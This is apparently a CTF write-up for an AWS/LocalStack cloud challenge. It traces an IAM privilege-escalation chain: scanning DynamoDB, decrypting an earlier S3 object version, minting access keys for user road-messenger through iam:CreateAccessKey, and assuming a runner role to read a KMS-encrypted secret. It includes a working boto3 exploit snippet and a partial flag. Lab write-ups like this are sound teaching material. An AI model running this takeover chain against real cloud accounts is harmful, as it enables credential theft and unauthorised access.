# Bought Riot

**Cyber Apocalypse CTF 2026 — Cloud (AWS / LocalStack)**

> A false story is spreading: one of Stormbound's captains supposedly sold the road schedule to Vaultrune.
> Miren can't accuse Lady Seralyne in front of the room. She has to find who started the rumor and who paid
> to spread it.

An IAM-privilege-escalation maze whose whole difficulty is a **misdirection**: the "tampered" record pushes
you to brute-force an ExternalId that was never the real gate. Flag format: `HTB{...}`.

## Access

Two ports. One is the **AWS API** (`AccessDeniedException / MissingAuthentication`, `x-amz-*` headers); the
other serves the starting credentials at `/player-creds.json` — IAM user `eastreach-supply-auditor`. Point
`AWS_ENDPOINT_URL` at the API port. Values are deterministic across spawns.

The auditor can do almost nothing: `dynamodb:Scan` on `supply-road-settlements` and `sts:AssumeRole`.

## 1. Find the LIVE settlement

The briefing says: *"Scan the table and isolate the LIVE row connected to the current accusation."* Of 224
rows (223 decoys), one has `status = LIVE`:

```
settlement_id       ROAD-3D9C
scanner_role_arn    arn:aws:iam::…:role/supply-road-scanner
scanner_external_id eastreach-road-scanner-3d9c        # legit — works
runner_external_id  eastreach-supply-road-runner-3d9c  # looks "tampered"
broker_code         EASTREACH-RELAY
manifest_bucket     supply-road-manifests
```

## 2. Auditor → scanner → the true manifest

`assume_role(supply-road-scanner, ExternalId=eastreach-road-scanner-3d9c)` succeeds. The scanner has
`s3:GetObject` on `manifests/*` and `kms:Decrypt`. `manifests/ROAD-3D9C.json` has **two versions**: the current
one is `COMPLIANCE_HOLD` / redacted; the **previous** version is a `kms:v3:…` blob. Decrypt it (pass the whole
string as `CiphertextBlob`):

```json
{ "broker_user": "road-messenger",
  "runner_role_arn": "arn:aws:iam::…:role/supply-road-runner",
  "payout_secret_name": "supply-road/payout/eastreach-relay-3d9c",
  "broker_code_template": "{broker_code}", "owner": "eastreach-logistics" }
```

- **Who started the rumor** → `road-messenger` (the broker user).
- **Who paid** → the secret `supply-road/payout/eastreach-relay-3d9c` — the flag.

Only `supply-road-runner` can read that secret.

## 3. The misdirection

The DynamoDB `runner_external_id` looks tampered (`eastreach-supply-road-runner-3d9c` vs the scanner's clean
`eastreach-road-scanner-3d9c`). It is tempting — and wrong — to brute the "real" ExternalId. A diagnostic
settles it:

```
auditor → assume(nonexistent-role)  = SUCCESS   # both principals have broad sts:AssumeRole
scanner → assume(nonexistent-role)  = SUCCESS
auditor → assume(supply-road-runner) = DENIED   # with and without any ExternalId
scanner → assume(supply-road-runner) = DENIED
```

Both callers can assume *anything nonexistent* (LocalStack mints creds for roles with no trust policy), but the
**real** runner role rejects both. So the gate is **not** the ExternalId — it's the runner's **trust policy**,
which trusts a third principal: the user **`road-messenger`**.

## 4. Escalation — CreateAccessKey on road-messenger

The scanner holds one overlooked write: **`iam:CreateAccessKey` on `road-messenger`**. Mint long-lived keys for
that user, become it, and assume the runner — now the DynamoDB `runner_external_id` works, because it was the
correct value all along; only the principal was ever the blocker.

```python
ak = scanner_iam.create_access_key(UserName="road-messenger")["AccessKey"]
runner = sts(ak).assume_role(RoleArn=".../supply-road-runner",
                             ExternalId="eastreach-supply-road-runner-3d9c")["Credentials"]
raw  = sm(runner).get_secret_value(SecretId="supply-road/payout/eastreach-relay-3d9c")["SecretBinary"]
flag = kms(runner).decrypt(CiphertextBlob=raw, KeyId=raw.decode().split(":")[2])["Plaintext"]
```

```
HTB{eastreach_road_resupply_spine_…}
```

## Root cause

`supply-road-scanner` is granted `iam:CreateAccessKey` over the broker user `road-messenger` — a full identity
takeover of the exact principal the payout-reading role trusts. The "tampered roster" narrative (a decoy
ExternalId) is pure misdirection to burn your time on a brute-force that can never succeed.

Reproduce with `.venv/bin/python pwn.py` (edit `EP`, `AK`, `SK` for the current instance).
